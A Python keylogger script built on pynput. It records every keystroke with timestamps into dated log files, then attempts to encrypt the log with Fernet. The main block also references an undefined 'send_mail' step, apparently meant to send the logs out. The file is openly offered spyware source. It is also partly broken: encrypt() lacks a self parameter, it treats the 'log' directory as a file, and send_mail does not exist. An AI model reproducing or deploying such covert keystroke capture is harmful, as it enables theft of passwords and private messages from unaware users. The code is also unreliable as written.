from pynput.keyboard import Key, Listener
import logging
import os
from datetime import date
from cryptography.fernet import Fernet



class Keylogger:
        
    def create_log_directory(self):
        sub_dir = "log" #specify the name of a file or directory
        cwd = os.getcwd() # retrieves the current working directory
        self.log_dir = os.path.join(cwd,sub_dir)
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)    # create a new directory with the given name
        
        
    @staticmethod  # returns key information if a key is pressed
    def on_press(key):
        try:
            logging.info(str(key))  # logs a message with the severity level of INFO
        except Exception as e:
            logging.info(e)   # exception object that was raised by the program
        
            
    def write_log_file(self):
        # time format example: '2023-02-03'
        time = str(date.today())
        # logging info in the file
        logging.basicConfig(
                 filename=(os.path.join(self.log_dir, time) + "-log.txt"),
                 # file format name: '.log/2023-02-03-log.txt'
                 level=logging.DEBUG, # sets the logging level to DEBUG
                 format= '[%(asctime)s]: %(message)s',
             )
        
        with Listener(on_press=self.on_press) as listener:  # creates a keyboard listener using the pynput
            listener.join()  # binds the instance of the Listener class to the variable listener
    
    def encrypt():
    # key generation
        key = Fernet.generate_key()

        # string the key in a file
        with open('filekey.key', 'wb') as filekey:
            filekey.write(key)

        # opening the key
        with open('filekey.key', 'rb') as filekey:
	        key = filekey.read()

        # using the generated key
        fernet = Fernet(key)

        # opening the original file to encrypt
        with open('log', 'rb') as file:
	        original = file.read()
	
        # encrypting the file
        encrypted = fernet.encrypt(original)

        # opening the file in write mode and
        # writing the encrypted data
        with open('log', 'wb') as encrypted_file:
	        encrypted_file.write(encrypted)


if __name__ == "__main__":
    klog = Keylogger()
    klog.create_log_directory()
    klog.write_log_file()
    klog.send_mail

    klog.encrypt()